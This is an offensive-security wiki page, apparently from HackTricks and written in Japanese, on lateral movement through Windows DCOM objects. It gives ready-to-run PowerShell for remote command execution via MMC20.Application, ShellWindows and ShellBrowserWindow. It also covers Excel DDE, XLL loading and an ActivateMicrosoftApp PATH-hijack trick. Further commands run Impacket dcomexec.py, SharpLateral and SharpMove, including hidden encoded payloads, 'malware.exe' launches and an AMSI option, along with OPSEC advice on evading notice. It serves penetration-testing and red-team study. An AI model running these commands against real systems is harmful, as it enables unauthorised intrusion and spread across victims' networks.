# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM の lateral movement は、サービスや scheduled task を作成する代わりに、RPC/DCOM 経由で公開されている既存の COM server を再利用するため魅力的です。実際には、初期接続は通常 TCP/135 で始まり、その後動的に割り当てられる高位の RPC port に移動します。

## Prerequisites & Gotchas

- 通常、対象に対して local administrator のコンテキストが必要で、さらに remote COM server が remote launch/activation を許可している必要があります。
- **2023年3月14日** 以降、Microsoft は対応システムに対して DCOM hardening を適用しています。低い activation authentication level を要求する古い client は、少なくとも `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` をネゴシエートしないと失敗することがあります。最近の Windows client は通常自動的に引き上げられるため、現在の tooling は普通そのまま動作します。
- 手動またはスクリプト化された DCOM execution には、一般的に TCP/135 と、対象の dynamic RPC port range が必要です。Impacket の `dcomexec.py` を使っていて command output を返したい場合は、通常 `ADMIN$`（または書き込み/読み取り可能な別の share）への SMB access も必要です。
- RPC/DCOM は動くが SMB が blocked されている場合でも、`dcomexec.py -nooutput` は blind execution に有用です。

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**この手法の詳細については、元の投稿 [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) を参照してください。**

Distributed Component Object Model (DCOM) objects は、オブジェクトに対するネットワークベースの interaction において興味深い capability を提供します。Microsoft は DCOM と Component Object Model (COM) の両方について包括的な documentation を提供しており、[DCOM はこちら](https://msdn.microsoft.com/en-us/library/cc226801.aspx) と [COM はこちら](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) からアクセスできます。DCOM applications の一覧は、次の PowerShell コマンドを使って取得できます:
```bash
Get-CimInstance Win32_DCOMApplication
```
COMオブジェクトである、[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)は、MMC snap-in の操作をスクリプト化できます。特にこのオブジェクトには、`Document.ActiveView` の下に `ExecuteShellCommand` メソッドがあります。このメソッドの詳細は[ここ](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)で確認できます。実行を確認してください:

この機能により、DCOM application を通じてネットワーク越しにコマンドを実行できます。管理者として DCOM にリモートで接続するには、PowerShell を次のように利用できます:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
このコマンドは DCOM application に接続し、COM object のインスタンスを返します。次に ExecuteShellCommand method を呼び出して、リモートホスト上で process を実行できます。この process は次の手順で進みます:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCE を取得する:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
最後の引数はウィンドウスタイルです。`7` はウィンドウを最小化したままにします。運用上、MMCベースの実行では通常、リモートの `mmc.exe` プロセスがあなたの payload を起動します。これは、以下の Explorer ベースのオブジェクトとは異なります。

## ShellWindows & ShellBrowserWindow

**この technique の詳細については、元の投稿 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) を確認してください**

**MMC20.Application** オブジェクトは明示的な "LaunchPermissions" を欠いており、既定では Administrators にアクセスを許可する permissions にフォールバックすることが確認されました。詳細については、スレッドを [here](https://twitter.com/tiraniddo/status/817532039771525120) で確認できます。また、明示的な Launch Permission を持たないオブジェクトをフィルタリングするために [@tiraniddo](https://twitter.com/tiraniddo) の OleView .NET を使用することが推奨されます。

2つの特定のオブジェクト、`ShellBrowserWindow` と `ShellWindows` は、明示的な Launch Permissions がないことから注目されました。`HKCR:\AppID\{guid}` 配下に `LaunchPermission` の registry entry が存在しないことは、明示的な permissions がないことを意味します。

`MMC20.Application` と比べて、これらのオブジェクトは、コマンドがリモートホスト上で `mmc.exe` ではなく、しばしば `explorer.exe` の子として終了するため、OPSEC の観点ではより静かです。

### ShellWindows

`ShellWindows` は ProgID を持たないため、.NET の `Type.GetTypeFromCLSID` と `Activator.CreateInstance` メソッドを使って、その AppID を用いた object instantiation が可能です。この process では OleView .NET を利用して `ShellWindows` の CLSID を取得します。インスタンス化後は、`WindowsShell.Item` メソッドを通じて操作でき、`Document.Application.ShellExecute` のような method invocation につながります。

object をインスタンス化して remote で commands を実行するための PowerShell commands の例が示されました:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` も同様ですが、CLSID 経由で直接インスタンス化でき、`Document.Application.ShellExecute` にピボットできます:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objectsを用いたLateral Movement

DCOM Excel objectsを悪用することでLateral movementを実現できます。詳細については、[Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) にある、DCOM経由でのLateral movementのためにExcel DDEを活用する解説を読むことを推奨します。

Empire projectは、DCOM objectsを操作することでExcelをremote code execution (RCE)に利用する方法を示すPowerShell scriptを提供しています。以下は、[Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) で公開されているscriptからの抜粋で、RCEのためにExcelを悪用するさまざまな方法を示しています:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
最近の研究では、`Excel.Application` の `ActivateMicrosoftApp()` メソッドによってこの分野が拡張されました。重要な考え方は、Excel がシステムの `PATH` を検索することで、FoxPro、Schedule Plus、Project などの古い Microsoft アプリケーションを起動しようと試みられる点です。オペレーターが、これらの期待される名前のいずれかを持つ payload を、ターゲットの `PATH` に含まれる書き込み可能な場所に配置できれば、Excel はそれを実行します。

このバリエーションの要件:

- ターゲット上で local admin
- ターゲットに Excel がインストールされていること
- ターゲットの `PATH` 内にある書き込み可能なディレクトリへ payload を書き込めること

FoxPro の検索 (`FOXPROW.exe`) を悪用する実践例:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
攻撃ホストにローカルの `Excel.Application` ProgID が登録されていない場合は、代わりに CLSID でリモートオブジェクトをインスタンス化します:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
実際に悪用されている値:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Lateral Movement のための Automation Tools

これらの techniques を自動化するために、2つの tools が強調されています:

- **Invoke-DCOM.ps1**: Empire project が提供する PowerShell script で、remote machines 上で code を実行するための異なる methods の呼び出しを簡略化します。この script は Empire GitHub repository で入手できます。

- **SharpLateral**: code を remotely 実行するための tool で、次の command と組み合わせて使用できます:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 自動化ツール

- Powershell スクリプト [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) を使うと、他のマシンでコードを実行するためのコメント付きの方法を簡単にすべて呼び出せる。
- Impacket の `dcomexec.py` を使って、DCOM 経由でリモートシステム上のコマンドを実行できる。現在のビルドは `ShellWindows`、`ShellBrowserWindow`、`MMC20` をサポートし、デフォルトは `ShellWindows`。
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- [**SharpLateral**](https://github.com/mertdas/SharpLateral) も使用できます:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [**SharpMove**](https://github.com/0xthirteen/SharpMove) を使うこともできます
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## 参考文献

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
